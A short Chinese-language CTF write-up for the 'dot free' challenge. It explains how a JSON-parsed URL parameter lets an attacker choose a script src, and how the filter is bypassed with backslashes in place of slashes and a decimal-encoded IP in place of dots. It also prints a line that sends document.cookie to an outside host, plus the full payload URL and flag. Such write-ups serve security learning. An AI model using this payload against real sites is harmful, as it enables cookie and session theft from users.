# dot free

這題一打開

可以看到一堆奇怪的js code

稍微分析一下，他會去抓參數來當成JSON parse

然後其中有段code去抓`data.iframe.value`，只要通過其規定的諸多限制，就會append一個script

(p.s.可以發現它typeof的括號寫錯惹)

而script的src是我們可控的，但不能有`//`和`.`等內容

這邊可以把`//`改成用`\\\\`一樣會work

再把domain name，改成用10進位形式就能繞過`.`的限制

a:

`document.location='http://kaibro.tw/?xss='+document.cookie;`

payload:

`http://13.57.104.34/?{ "iframe":{"value":"http:\\\\921608994/a"}}`

接著只要把這個payload送過去後端

他就會把cookie(flag)噴回來惹

flag:

`rwctf{L00kI5TheFlo9}`
